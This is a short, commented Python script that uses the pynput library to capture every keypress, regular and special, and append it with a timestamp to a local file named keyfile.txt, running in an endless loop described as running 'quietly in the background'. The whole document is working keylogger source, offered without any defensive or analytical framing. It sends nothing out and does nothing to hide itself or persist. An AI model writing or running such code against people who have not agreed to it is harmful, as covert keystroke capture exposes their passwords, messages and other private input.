from pynput import keyboard   # Import the keyboard listener from the pynput library
from datetime import datetime   # Used to timestamp each keypress
import time    # Used to keep the script running
def keyPressed(key):    # Handles key press events, logs the key pressed along with the timestamp.
     with open("keyfile.txt", 'a') as logKey:  # Open the log file in append mode so previous keystrokes are not overwritten
         try:
             # Log regular character (letters, numbers) 
             logKey.write(f"{datetime.now()} - {key.char}\n")
         except AttributeError:
             # Log special keys (like Enter, Shift, etc.) with timestamp in brackets
             logKey.write(f"{datetime.now()} - [{key.name}]\n")
 
if __name__ == "__main__":
     # Start listening for key presses
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()  # Start listening
     # Keep the script running quietly in the background
     while True:
         time.sleep(1) # Sleep to prevent high CPU usage
 
 
